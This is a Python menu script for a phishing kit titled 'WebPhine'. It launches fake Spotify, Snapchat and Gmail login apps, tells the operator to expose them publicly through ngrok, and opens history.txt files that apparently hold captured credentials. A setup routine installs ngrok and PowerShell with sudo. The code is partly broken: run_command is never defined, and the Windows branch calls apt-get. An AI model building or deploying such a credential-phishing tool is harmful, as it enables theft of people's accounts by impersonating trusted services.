import os
import time
import subprocess
def main():
    print("\033[91m" + """ 
 _        __   _     ____  _     _            
\ \      / /__| |__ |  _ \| |__ (_)_ __   ___ 
 \ \ /\ / / _ \ '_ \| |_) | '_ \| | '_ \ / _ 
  \ V  V /  __/ |_) |  __/| | | | | | | |  __/
   \_/\_/ \___|_.__/|_|   |_| |_|_|_| |_|\___|

   """ + "\033[0m")
    print("\033[95m" +"install tools-0"+ "\033[0m")
    print("\033[95m" +"spotify-1"+ "\033[0m")
    print("\033[95m" +"snapchat-2"+ "\033[0m")
    print("\033[95m" +"gmail-3"+ "\033[0m")
    print("\033[95m" +"library-5"+ "\033[0m")
    print("\033[95m" +"exit-6"+ "\033[0m")
    bbb = int(input("\033[92m" +"-->"+ "\033[0m"))
    if bbb == 0:
      os.system("which pwsh")
      os.system("which python3")
      os.system("sudo apt-get install -y wget apt-transport-https software-properties-common")
      os.system("wget -q https://packages.microsoft.com/keys/microsoft.asc -O- | sudo apt-key add -")
      os.system("sudo add-apt-repository 'deb [arch=amd64] https://packages.microsoft.com/repos/microsoft-debian-buster-prod buster main'")
      os.system("sudo apt-get update")
      os.system("sudo apt-get install -y powershell")
      os.system("wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O /tmp/ngrok.tgz")
      os.system("sudo tar -xvzf /tmp/ngrok.tgz -C /usr/local/bin")
      os.system("ngrok config add-authtoken ")
      main()
    elif bbb == 1:
      print('run ngrok http 8000')
      current_directory = os.path.dirname(os.path.abspath(__file__))
      
      open_file = os.path.join(current_directory, 'spotify', 'history.txt')
      subprocess.run(['open', open_file])

      app_file = os.path.join(current_directory, 'spotify', 'app.py')
      subprocess.run(['python3', app_file])
    elif bbb == 2:
      print("run ngrok http 8000")
      current_directory = os.path.dirname(os.path.abspath(__file__))

      open2_file = os.path.join(current_directory, 'snapchat' , 'history.txt')
      subprocess.run(['open', open2_file])

      app2_file = os.path.join(current_directory, 'snapchat', 'app.py')
      subprocess.run(['python3', app2_file])
    elif bbb == 3:
      print('run ngrok http 8000')
      current_directory = os.path.dirname(os.path.abspath(__file__))
      

      open3_file = os.path.join(current_directory, 'email', 'history.txt')
      subprocess.run(['open', open3_file])
      
      app3_file  = os.path.join(current_directory, 'email', 'app.py')
      subprocess.run(['python3', app3_file])
    elif bbb == 6:
      exit()
    elif bbb == 5:
      os.system("pwsh main.ps1")
      



print("\033[91m" + """ 
 _        __   _     ____  _     _            
\ \      / /__| |__ |  _ \| |__ (_)_ __   ___ 
 \ \ /\ / / _ \ '_ \| |_) | '_ \| | '_ \ / _ 
  \ V  V /  __/ |_) |  __/| | | | | | | |  __/
   \_/\_/ \___|_.__/|_|   |_| |_|_|_| |_|\___|

   """ + "\033[0m")

os_type = os.name

if os_type == 'posix':
   print("linux detected")
   a = input("press enter if u want to continue or type skip: ")
   if a == "skip":
      os.system("clear")

      main()
   else:
      run_command("which pwsh")
      run_command("which python3")
      run_command("sudo apt-get install -y wget apt-transport-https software-properties-common")
      run_command("wget -q https://packages.microsoft.com/keys/microsoft.asc -O- | sudo apt-key add -")
      run_command("sudo add-apt-repository 'deb [arch=amd64] https://packages.microsoft.com/repos/microsoft-debian-buster-prod buster main'")
      run_command("sudo apt-get update")
      run_command("sudo apt-get install -y powershell")
      run_command("wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O /tmp/ngrok.tgz")
      run_command("sudo tar -xvzf /tmp/ngrok.tgz -C /usr/local/bin")
      run_command("ngrok config add-authtoken ")
      main()
      
elif os_type == 'nt':
   print("windows detected")
   a = input("press enter if u want to continue or type skip: ")
   if a == "skip":
      os.system("clear")
      main()
   else:
      run_command("which pwsh")
      run_command("which python3")
      run_command("sudo apt-get install -y wget apt-transport-https software-properties-common")
      run_command("wget -q https://packages.microsoft.com/keys/microsoft.asc -O- | sudo apt-key add -")
      run_command("sudo add-apt-repository 'deb [arch=amd64] https://packages.microsoft.com/repos/microsoft-debian-buster-prod buster main'")
      run_command("sudo apt-get update")
      run_command("sudo apt-get install -y powershell")
      run_command("wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O /tmp/ngrok.tgz")
      run_command("sudo tar -xvzf /tmp/ngrok.tgz -C /usr/local/bin")
      run_command("ngrok config add-authtoken ")
      main()
else :
   print("no OS detected")
time.sleep(2)
os.system("clear")

